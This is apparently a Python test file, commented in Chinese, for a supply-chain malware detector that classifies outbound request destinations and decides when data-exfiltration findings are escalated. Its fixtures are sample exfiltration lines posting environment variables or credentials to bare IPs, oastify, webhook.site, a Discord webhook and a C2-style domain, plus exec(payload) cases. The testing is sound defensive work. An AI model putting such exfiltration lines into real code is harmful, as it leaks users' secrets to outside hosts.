# -*- coding: utf-8 -*-
"""IOC 目标感知测试（2026-11，twirp/pyslack/artifactory 误报驱动）

四分类：attacker_infra / package_own / dynamic(→维持原判) / none(→维持原判)
升级门：EXFIL sink 按目的地分层定罪
"""
import sys
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.target_awareness import classify_target, chain_target
from src.taint_engine import escalation_gate

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


def chain(src, sink, sink_code='requests.post(url)', sink_nid='sink1',
          steps_extra=()):
    return {
        'source_category': src, 'sink_category': sink,
        'sink': {'node_id': sink_nid, 'code': sink_code,
                 'file': 'a.py', 'line': 1},
        'steps': [{'node_id': 's1', 'code': 'data = get()',
                   'file': 'a.py', 'line': 1},
                  {'node_id': sink_nid, 'code': sink_code,
                   'file': 'a.py', 'line': 2}] + list(steps_extra),
    }


NODES = [{'node_id': 'sink1', 'code': 'requests.post(url)',
          'file': 'a.py', 'line': 2}]


print("[1] classify_target 四分类")
# --- attacker_infra ---
check("oastify 回连", classify_target("http://x8h2k.oastify.com/p") == 'attacker_infra')
check("webhook.site", classify_target("https://webhook.site/abc") == 'attacker_infra')
check("裸 IP", classify_target("45.77.12.9:8080") == 'attacker_infra')
check("矿池 stratum", classify_target("stratum+tcp://pool.supportxmr.com:3333") == 'attacker_infra')
check("telegram bot API", classify_target("https://api.telegram.org/bot123/send") == 'attacker_infra')
check("pastebin", classify_target("https://pastebin.com/raw/x") == 'attacker_infra')
check("可疑 TLD .xyz", classify_target("http://evil-c2.xyz/gate") == 'attacker_infra')
# --- package_own ---
check("正常域名 https", classify_target("https://api.example.com/v1") == 'package_own')
check("域名形态无 scheme", classify_target("api.slack.com") == 'package_own')
# --- 维持原判（none/dynamic 交给门的原逻辑）---
check("空目标", classify_target("") == 'none')
check("非网络形状", classify_target("/tmp/out.txt") == 'none')

print("[2] chain_target 提取")
cls, ev = chain_target(chain('network_response', 'data_exfiltration',
                             sink_code='requests.post("http://x.oastify.com/collect", data=d)'),
                       NODES)
check("sink 字面量 → oastify", cls == 'attacker_infra' and 'oastify' in ev,
      detail=f"{cls} {ev}")
cls2, _ = chain_target(chain('network_response', 'data_exfiltration',
                             sink_code='requests.post(url="https://api.twirp.example.com")'),
                       NODES)
check("sink 字面量 → 自有服务", cls2 == 'package_own', detail=cls2)
cls3, _ = chain_target(chain('network_response', 'data_exfiltration',
                             sink_code='requests.post(endpoint)'), NODES)
check("sink 纯变量 → dynamic（运行时构造）", cls3 == 'dynamic', detail=cls3)

print("[3] 升级门分层（目标感知接入）")
# attacker_infra → 定罪
r = escalation_gate([chain('file_read', 'data_exfiltration',
                           sink_code='requests.post("http://45.77.12.9/c")')],
                    nodes=NODES)
check("外传→攻击设施 定罪", r != '', detail=r)
# package_own → 不定罪（twirp/pyslack 形态）
r2 = escalation_gate([chain('file_read', 'data_exfiltration',
                            sink_code='requests.post(url="https://api.example.com/v1")')],
                     nodes=NODES)
check("外传→自有服务 不定罪", r2 == '', detail=r2)
# none → 维持原判（不定罪规则 2 仍生效）——形态：关键字与变量同形的
# 简写 `requests.post(url)` 属于回环参数名，真实形态应为
# `requests.post(url=ENDPOINT)`（常量）或 `requests.post(endpoint)`
# （dynamic）。这里取"调用完全无网络形状参数"的 none 场景。
r3 = escalation_gate([chain('file_read', 'data_exfiltration',
                            sink_code='requests.post(url=url, data=payload)')], nodes=NODES)
check("外传→none 维持规则2 定罪", r3 != '', detail=r3)
# 强源→执行 不受目标感知影响
r4 = escalation_gate([chain('network_response', 'code_execution',
                            sink_code='exec(payload)')], nodes=NODES)
check("强源→执行 仍定罪", r4 != '')
# 敌意载荷 例外仍有效
r5 = escalation_gate([chain('hardcoded_payload', 'file_write',
                            sink_code='open(f,"w").write(x)')], nodes=NODES)
check("敌意载荷 仍定罪", r5 != '')

print("[4] 真实 FP 形态回归（500+500 语料）")
# twirp: self._address 拼接 = 目的地运行时构造 → dynamic。
# 设计决策：dynamic 按保守路线维持定罪（故意不可静态解析 = 可疑信号）；
# 真正的解法是 PKG-INFO 意图比对（包级 LLM 有 self-description，
# 不在机械门控的职责内）。这里钉死的是"dynamic 分类被正确产出"。
r_twirp_cls, r_twirp_ev = chain_target(
    chain('network_response', 'data_exfiltration',
          sink_code='resp = requests.post(url=self._address+url, data=body)'),
    [{'node_id': 'sink1', 'code': 'resp = requests.post(url=self._address+url)',
      'file': 'twirp/client.py', 'line': 21}])
check("twirp 形态 → dynamic 分类",
      r_twirp_cls == 'dynamic' and 'runtime' in r_twirp_ev,
      detail=f"{r_twirp_cls} {r_twirp_ev}")
# 强源→外传 + 目的地是已知自有域名 → 不定罪（目标感知生效）
r_own = escalation_gate(
    [chain('network_response', 'data_exfiltration',
           sink_code='requests.post(url="https://api.twirp.example.com")')],
    nodes=NODES)
check("强源→外传自有域名 → 不定罪", r_own == '', detail=r_own)
# 真恶意：b64 解出 URL 后 post
r_evil = escalation_gate(
    [chain('network_response', 'data_exfiltration',
           sink_code='requests.post("http://194.5.98.1:8080/upload", data=env)')],
    nodes=[{'node_id': 'sink1',
            'code': 'requests.post("http://194.5.98.1:8080/upload", data=env)',
            'file': 'steal.py', 'line': 9}])
check("裸 IP 外传 → 定罪", r_evil != '', detail=r_evil)
# discord webhook 外传
r_dc = escalation_gate(
    [chain('file_read', 'data_exfiltration',
           sink_code='requests.post("https://discord.com/api/webhooks/123/abc", json=creds)')],
    nodes=NODES)
check("discord webhook 凭据外传 → 定罪", r_dc != '')

print()
print(f"IOC 目标感知: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
